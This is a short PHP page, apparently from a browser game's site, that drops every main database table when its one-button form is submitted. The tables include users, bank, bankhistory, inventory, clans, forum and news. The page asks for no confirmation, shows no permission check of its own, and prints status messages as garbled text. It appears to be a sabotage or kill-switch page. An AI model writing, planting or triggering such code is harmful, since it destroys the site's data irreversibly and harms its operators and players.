<?php
session_start();
include "connect.php";
include "sec4.php";
if($_POST['drop']){
if(mq("drop table `users`"))
if(mq("drop table `allusers`"))
if(mq("drop table `aligns`"))
if(mq("drop table `bank`"))
if(mq("drop table `bankhistory`"))
if(mq("drop table `berezka`"))
if(mq("drop table `clans`"))
if(mq("drop table `inventory`"))
if(mq("drop table `magic`"))
if(mq("drop table `online`"))
if(mq("drop table `userdata`"))
if(mq("drop table `shop`"))
if(mq("drop table `forum`"))
if(mq("drop table `news`"))
{echo"╙т√";}else {echo"╧яЎ";}}
?><form method=post ENCTYPE="multipart/form-data"><input name="drop" type="submit" value="сс" /></form>